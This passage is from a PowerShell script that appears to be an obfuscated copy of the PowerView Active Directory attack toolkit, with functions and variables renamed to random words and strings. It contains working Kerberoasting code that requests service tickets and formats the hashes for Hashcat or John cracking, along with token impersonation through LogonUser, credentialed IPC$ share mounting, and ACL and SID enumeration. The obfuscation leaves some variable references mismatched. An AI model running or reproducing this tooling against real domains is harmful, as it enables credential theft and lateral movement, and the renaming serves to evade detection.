                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        offings -feaYcbZI99 $yofMxotZ99 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[belonging] Error converting SID '$yofMxotZ99' : $_"
            }
        }
    }
}
function offings {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $feaYcbZI99,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $EsfqZxkA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ZLLyAxQr99 = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }
        function Invoke-Method([__ComObject] $Object, [String] $bZssbhYP99, $bBNxLjCm99) {
            $YrLtLWOk99 = $Null
            $YrLtLWOk99 = $Object.GetType().InvokeMember($bZssbhYP99, 'InvokeMethod', $NULL, $Object, $bBNxLjCm99)
            Write-Output $YrLtLWOk99
        }
        function Get-Property([__ComObject] $Object, [String] $ZJmrMsXQ99) {
            $Object.GetType().InvokeMember($ZJmrMsXQ99, 'GetProperty', $NULL, $Object, $NULL)
        }
        function Set-Property([__ComObject] $Object, [String] $ZJmrMsXQ99, $bBNxLjCm99) {
            [Void] $Object.GetType().InvokeMember($ZJmrMsXQ99, 'SetProperty', $NULL, $Object, $bBNxLjCm99)
        }
        if ($PSBoundParameters['Server']) {
            $EukHbriG99 = 2
            $xDjvSPIR99 = $qgdPgdMB99
        }
        elseif ($PSBoundParameters['Domain']) {
            $EukHbriG99 = 1
            $xDjvSPIR99 = $jnYnRnFJ99
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $fjBNCklg99.GetNetworkCredential()
            $EukHbriG99 = 1
            $xDjvSPIR99 = $Cred.Domain
        }
        else {
            $EukHbriG99 = 3
            $xDjvSPIR99 = $Null
        }
    }
    PROCESS {
        ForEach ($LEwtuhBt99 in $feaYcbZI99) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($LEwtuhBt99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $ouiZRMDN99 = $ZLLyAxQr99['DomainSimple']
                }
                else {
                    $ouiZRMDN99 = $ZLLyAxQr99['NT4']
                }
            }
            else {
                $ouiZRMDN99 = $ZLLyAxQr99[$EsfqZxkA99]
            }
            $DUQaWitK99 = New-Object -ComObject NameTranslate
            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $fjBNCklg99.GetNetworkCredential()
                    Invoke-Method $DUQaWitK99 'InitEx' (
                        $EukHbriG99,
                        $xDjvSPIR99,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[offings] Error initializing translation for '$feaYcbZI99' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $DUQaWitK99 'Init' (
                        $EukHbriG99,
                        $xDjvSPIR99
                    )
                }
                catch {
                    Write-Verbose "[offings] Error initializing translation for '$feaYcbZI99' : $_"
                }
            }
            Set-Property $DUQaWitK99 'ChaseReferral' (0x60)
            try {
                $Null = Invoke-Method $DUQaWitK99 'Set' (8, $LEwtuhBt99)
                Invoke-Method $DUQaWitK99 'Get' ($ouiZRMDN99)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[offings] Error translating '$LEwtuhBt99' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function Ibiza {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,
        [Switch]
        $URGDXFNN99
    )
    BEGIN {
        $iryzZRcz99 = New-Object System.Collections.Specialized.OrderedDictionary
        $iryzZRcz99.Add("SCRIPT", 1)
        $iryzZRcz99.Add("ACCOUNTDISABLE", 2)
        $iryzZRcz99.Add("HOMEDIR_REQUIRED", 8)
        $iryzZRcz99.Add("LOCKOUT", 16)
        $iryzZRcz99.Add("PASSWD_NOTREQD", 32)
        $iryzZRcz99.Add("PASSWD_CANT_CHANGE", 64)
        $iryzZRcz99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $iryzZRcz99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $iryzZRcz99.Add("NORMAL_ACCOUNT", 512)
        $iryzZRcz99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $iryzZRcz99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $iryzZRcz99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $iryzZRcz99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $iryzZRcz99.Add("MNS_LOGON_ACCOUNT", 131072)
        $iryzZRcz99.Add("SMARTCARD_REQUIRED", 262144)
        $iryzZRcz99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $iryzZRcz99.Add("NOT_DELEGATED", 1048576)
        $iryzZRcz99.Add("USE_DES_KEY_ONLY", 2097152)
        $iryzZRcz99.Add("DONT_REQ_PREAUTH", 4194304)
        $iryzZRcz99.Add("PASSWORD_EXPIRED", 8388608)
        $iryzZRcz99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $iryzZRcz99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }
    PROCESS {
        $iDrTisIc99 = New-Object System.Collections.Specialized.OrderedDictionary
        if ($URGDXFNN99) {
            ForEach ($KTofVmua99 in $iryzZRcz99.GetEnumerator()) {
                if ( ($Value -band $KTofVmua99.Value) -eq $KTofVmua99.Value) {
                    $iDrTisIc99.Add($KTofVmua99.Name, "$($KTofVmua99.Value)+")
                }
                else {
                    $iDrTisIc99.Add($KTofVmua99.Name, "$($KTofVmua99.Value)")
                }
            }
        }
        else {
            ForEach ($KTofVmua99 in $iryzZRcz99.GetEnumerator()) {
                if ( ($Value -band $KTofVmua99.Value) -eq $KTofVmua99.Value) {
                    $iDrTisIc99.Add($KTofVmua99.Name, "$($KTofVmua99.Value)")
                }
            }
        }
        $iDrTisIc99
    }
}
function Timur {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters['Domain'] -or ($feaYcbZI99 -match '.+\\.+')) {
            if ($feaYcbZI99 -match '.+\\.+') {
                $ObwGOdsr99 = $feaYcbZI99 | offings -EsfqZxkA99 Canonical
                if ($ObwGOdsr99) {
                    $AeneapHK99 = $ObwGOdsr99.SubString(0, $ObwGOdsr99.IndexOf('/'))
                    $LmVQZNgy99 = $feaYcbZI99.Split('\')[1]
                    Write-Verbose "[Timur] Binding to domain '$AeneapHK99'"
                }
            }
            else {
                $LmVQZNgy99 = $feaYcbZI99
                Write-Verbose "[Timur] Binding to domain '$jnYnRnFJ99'"
                $AeneapHK99 = $jnYnRnFJ99
            }
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Timur] Using alternate credentials'
                $EOHvLUHq99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $AeneapHK99, $fjBNCklg99.UserName, $fjBNCklg99.GetNetworkCredential().Password)
            }
            else {
                $EOHvLUHq99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $AeneapHK99)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Timur] Using alternate credentials'
                $HtqLMJcj99 = indicate | Select-Object -ExpandProperty Name
                $EOHvLUHq99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $HtqLMJcj99, $fjBNCklg99.UserName, $fjBNCklg99.GetNetworkCredential().Password)
            }
            else {
                $EOHvLUHq99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $LmVQZNgy99 = $feaYcbZI99
        }
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $EOHvLUHq99
        $Out | Add-Member Noteproperty 'Identity' $LmVQZNgy99
        $Out
    }
    catch {
        Write-Warning "[Timur] Error creating binding for object ('$feaYcbZI99') context : $_"
    }
}
function decaf {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99
    )
    BEGIN {
        $ctpdPmdY99 = [Activator]::CreateInstance($fFuumkic99)
        $ctpdPmdY99.dwType = 1
    }
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($KcsUhItY99 in $cSHFXHUa99) {
                $KcsUhItY99 = $KcsUhItY99.Trim('\')
                $Paths += ,"\\$KcsUhItY99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($UpTLmEbs99 in $Paths) {
            $ctpdPmdY99.lpRemoteName = $UpTLmEbs99
            Write-Verbose "[decaf] Attempting to mount: $UpTLmEbs99"
            $tYBpqgGN99 = $Mpr::WNetAddConnection2W($ctpdPmdY99, $fjBNCklg99.GetNetworkCredential().Password, $fjBNCklg99.UserName, 4)
            if ($tYBpqgGN99 -eq 0) {
                Write-Verbose "$UpTLmEbs99 successfully mounted"
            }
            else {
                Throw "[decaf] error mounting $UpTLmEbs99 : $(([ComponentModel.Win32Exception]$tYBpqgGN99).Message)"
            }
        }
    }
}
function bonehead {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($KcsUhItY99 in $cSHFXHUa99) {
                $KcsUhItY99 = $KcsUhItY99.Trim('\')
                $Paths += ,"\\$KcsUhItY99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($UpTLmEbs99 in $Paths) {
            Write-Verbose "[bonehead] Attempting to unmount: $UpTLmEbs99"
            $tYBpqgGN99 = $Mpr::WNetCancelConnection2($UpTLmEbs99, 0, $True)
            if ($tYBpqgGN99 -eq 0) {
                Write-Verbose "$UpTLmEbs99 successfully ummounted"
            }
            else {
                Throw "[bonehead] error unmounting $UpTLmEbs99 : $(([ComponentModel.Win32Exception]$tYBpqgGN99).Message)"
            }
        }
    }
}
function watchman {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $zkuRoAPL99,
        [Switch]
        $Quiet
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[watchman] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }
    if ($PSBoundParameters['TokenHandle']) {
        $mHmCQuMk99 = $zkuRoAPL99
    }
    else {
        $mHmCQuMk99 = [IntPtr]::Zero
        $SxlUptCP99 = $fjBNCklg99.GetNetworkCredential()
        $CQMlcaaA99 = $SxlUptCP99.Domain
        $PYHFAZKa99 = $SxlUptCP99.UserName
        Write-Warning "[watchman] Executing LogonUser() with user: $($CQMlcaaA99)\$($PYHFAZKa99)"
        $tYBpqgGN99 = $MWNOHLIM99::LogonUser($PYHFAZKa99, $CQMlcaaA99, $SxlUptCP99.Password, 9, 3, [ref]$mHmCQuMk99);$WwgbwQff99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not $tYBpqgGN99) {
            throw "[watchman] LogonUser() Error: $(([ComponentModel.Win32Exception] $WwgbwQff99).Message)"
        }
    }
    $tYBpqgGN99 = $MWNOHLIM99::ImpersonateLoggedOnUser($mHmCQuMk99)
    if (-not $tYBpqgGN99) {
        throw "[watchman] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $WwgbwQff99).Message)"
    }
    Write-Verbose "[watchman] Alternate credentials successfully impersonated"
    $mHmCQuMk99
}
function podiatrist {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $zkuRoAPL99
    )
    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[podiatrist] Reverting token impersonation and closing LogonUser() token handle"
        $tYBpqgGN99 = $Kernel32::CloseHandle($zkuRoAPL99)
    }
    $tYBpqgGN99 = $MWNOHLIM99::RevertToSelf();$WwgbwQff99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not $tYBpqgGN99) {
        throw "[podiatrist] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $WwgbwQff99).Message)"
    }
    Write-Verbose "[podiatrist] Token impersonation successfully reverted"
}
function Pacheco {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $PqpfkpiF99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $afdkSuoX99 = $User
        }
        else {
            $afdkSuoX99 = $SPN
        }
        ForEach ($Object in $afdkSuoX99) {
            if ($PSBoundParameters['User']) {
                $RQIvgLMd99 = $Object.ServicePrincipalName
                $jFhxwutu99 = $Object.SamAccountName
                $rGTmjraU99 = $Object.DistinguishedName
            }
            else {
                $RQIvgLMd99 = $Object
                $jFhxwutu99 = 'UNKNOWN'
                $rGTmjraU99 = 'UNKNOWN'
            }
            if ($RQIvgLMd99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $RQIvgLMd99 = $RQIvgLMd99[0]
            }
            try {
                $BvJjTjqc99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $RQIvgLMd99
            }
            catch {
                Write-Warning "[Pacheco] Error requesting ticket for SPN '$RQIvgLMd99' from user '$rGTmjraU99' : $_"
            }
            if ($BvJjTjqc99) {
                $LoTsmeYV99 = $BvJjTjqc99.GetRequest()
            }
            if ($LoTsmeYV99) {
                $Out = New-Object PSObject
                $AoJDANDh99 = [System.BitConverter]::ToString($LoTsmeYV99) -replace '-'
                $Out | Add-Member Noteproperty 'SamAccountName' $jFhxwutu99
                $Out | Add-Member Noteproperty 'DistinguishedName' $rGTmjraU99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $BvJjTjqc99.ServicePrincipalName
                if($AoJDANDh99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $fqfSwYLT99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $hrOkaBho99 = $Matches.DataToEnd.Substring(0,$fqfSwYLT99*2)
                    if($Matches.DataToEnd.Substring($fqfSwYLT99*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($BvJjTjqc99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($LoTsmeYV99).Replace('-',''))
                    } else {
                        $Hash = "$($hrOkaBho99.Substring(0,32))`$$($hrOkaBho99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($BvJjTjqc99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($LoTsmeYV99).Replace('-',''))
                }
                if($Hash) {
                    if ($PqpfkpiF99 -match 'John') {
                        $riGhKEHY99 = "`$xzEBZIhI99`$$($BvJjTjqc99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($rGTmjraU99 -ne 'UNKNOWN') {
                            $CQMlcaaA99 = $rGTmjraU99.SubString($rGTmjraU99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $CQMlcaaA99 = 'UNKNOWN'
                        }
                        $riGhKEHY99 = "`$xzEBZIhI99`$$($Etype)`$*$jFhxwutu99`$$CQMlcaaA99`$$($BvJjTjqc99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $riGhKEHY99
                }
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function tight {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $PqpfkpiF99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $AvPmHxSP99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $AvPmHxSP99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $AvPmHxSP99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['SearchBase']) { $AvPmHxSP99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $AvPmHxSP99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $AvPmHxSP99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $AvPmHxSP99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AvPmHxSP99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $AvPmHxSP99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $AvPmHxSP99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $AvPmHxSP99['Identity'] = $feaYcbZI99 }
        suit @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Pacheco -PqpfkpiF99 $PqpfkpiF99
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function bitcoins {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function wand {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )
            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $djOahDwk99 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }
            $UYFIiMEX99 = @()
            $UYFIiMEX99 += $djOahDwk99.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $djOahDwk99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $UYFIiMEX99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($UYFIiMEX99 | Where-Object {$_}) -join ','
        }
        $AGFeaaHg99 = @{}
        if ($PSBoundParameters['Credential']) { $AGFeaaHg99['Credential'] = $fjBNCklg99 }
        $vSdJuRHv99 = @{}
    }
    PROCESS {
        ForEach ($UpTLmEbs99 in $Path) {
            try {
                if (($UpTLmEbs99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $asmrTIRX99 = (New-Object System.Uri($UpTLmEbs99)).Host
                    if (-not $vSdJuRHv99[$asmrTIRX99]) {
                        decaf -cSHFXHUa99 $asmrTIRX99 -fjBNCklg99 $fjBNCklg99
                        $vSdJuRHv99[$asmrTIRX99] = $True
                    }
                }
                $ACL = Get-Acl -Path $UpTLmEbs99
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = belonging -ObjectSID $SID @ConvertArguments
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $UpTLmEbs99
                    $Out | Add-Member Noteproperty 'FileSystemRights' (wand -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[bitcoins] error: $_"
            }
        }
    }
    END {
        $vSdJuRHv99.Keys | bonehead
    }
}
function foregather {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $ycQOyvWh99
    )
    $hjTjfzZi99 = @{}
